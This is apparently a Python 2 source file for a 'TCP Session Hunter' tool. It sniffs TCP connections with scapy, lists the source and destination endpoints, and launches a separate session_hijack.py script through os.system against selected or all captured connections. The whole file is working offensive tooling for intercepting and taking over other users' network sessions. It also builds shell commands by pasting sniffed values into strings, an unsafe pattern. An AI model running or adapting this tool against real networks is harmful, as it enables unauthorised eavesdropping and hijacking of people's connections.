import os
import sys
import string
import thread
from scapy.all import *
 
execute = []
ip_src = []
port_src = []
ip_dst = []
port_dst = []
 
def intro():
 print("                        _______         ") 
 print("                           |            ")
 print("                           |            ")
 print("                           |             ")
 print("                                          ")
 print("                    TCP SESSION HUNTER")
                             
print(""
      ""
      ""
      ""
      "")
 
def list_remp(p):
 if p.haslayer(IP) and p.haslayer(TCP):
  if p[IP].src not in ip_src or p[TCP].sport not in port_src or p[IP].dst not in ip_dst or p[TCP].dport not in port_dst:
   ip_src.append(p[IP].src)
   port_src.append(p[TCP].sport)
   ip_dst.append(p[IP].dst)
   port_dst.append(p[TCP].dport)
 
def list_remp_filter(p, ip):
 if p.haslayer(IP) and p.haslayer(TCP):
  if p[IP].src == ip or p[IP].dst == ip:
   if p[IP].src not in ip_src or p[TCP].sport not in port_src or p[IP].dst not in ip_dst or p[TCP].dport not in port_dst:
    ip_src.append(p[IP].src)
    port_src.append(p[TCP].sport)
    ip_dst.append(p[IP].dst)
    port_dst.append(p[TCP].dport)
 
def sniff_connect(device):
  try:
   sniff(count=0, prn=list_remp, iface=device)
  except:
   print "Can't Launch sniffer... \n"
   sys.exit()
 
def sniff_connect_filter(device, ip):
  try:
   sniff(count=0, prn= lambda p : list_remp_filter(p,ip), iface=device)
  except:
   print "Can't Launch sniffer...\n"
   sys.exit()
 
os.system("clear")
intro()
 
if len(sys.argv) < 2:
 print "Usage: SessionHunter <interface>\n"
else:
 while 1:
    inp = raw_input(" > \n")
    if string.lower(inp) == "help" or string.lower(inp) == "h":
      print "             help, h:              Show Options"
      print "             sniff:                sniff all Connecions"
      print "             sniff <ip>:           sniff IP  : ex: sniff 10.0.2.15"
      print "             ls:                   List connections"
      print "             hijack_list [n m ..]: Hijack Connexion :: ex: hijack 0 1 2"
      print "             hijack_all:           Hijack Connexion :: ex: hijack_all"
      print "             hijack <n>:           Hijack Connexion :: ex: hijack 2"
      print "             clear:                Clear CLI"
      print "             empty:                Empty list connections"
      print "             quit, exit, q, e:     Exit"
      
    elif string.lower(inp) == "ls":
     print "\n"
     if len(ip_src) > 1:
      for i in range(len(ip_src)):
       print "             ["+str(i)+"] " + ip_src[i] + ":" + str(port_src[i]) + " > " + ip_dst[i] + ":" + str(port_dst[i]) 
     else:
      print "             no connections found"
    elif string.lower(inp) == "empty":
     ip_src = []
     port_src = []
     ip_dst = []
     port_dst = []
    elif string.lower(inp) == "clear": 
     os.system("clear")
     intro()
    elif string.lower(inp) == "q" or string.lower(inp) == "quit" or string.lower(inp) == "e" or string.lower(inp) == "exit":
     sys.exit()
    elif string.lower(inp) == "sniff":
     thread.start_new_thread(sniff_connect, (sys.argv[1], ))
    else:
     execute = inp.split(" ")
     if string.lower(execute[0]) == "sniff":
      thread.start_new_thread(sniff_connect_filter, (sys.argv[1],execute[1], ))
     elif string.lower(execute[0]) == "hijack_list":
      for x in range(1,len(execute)):
      	num = execute[x]
      	cmd = "xterm -e python session_hijack.py " + ip_src[int(num)] + " " + str(ip_dst[int(num)]) + " " + str(port_dst[int(num)]) + " " + sys.argv[1] + " &"
      	os.system(cmd)
     elif string.lower(execute[0]) == "hijack_all":
      for x in range(len(ip_src)):
      	cmd = "xterm -e python session_hijack.py " + ip_src[x] + " " + str(ip_dst[x]) + " " + str(port_dst[x]) + " " + sys.argv[1] + " &"
      	os.system(cmd)
     elif string.lower(execute[0]) == "hijack":
      for x in range(1,len(execute)):
      	num = execute[x]
      	cmd = "xterm -e python session_hijack.py " + ip_src[int(num)] + " " + str(ip_dst[int(num)]) + " " + str(port_dst[int(num)]) + " " + sys.argv[1] + " &"
      	os.system(cmd)
     else:
      print "Not an option!"
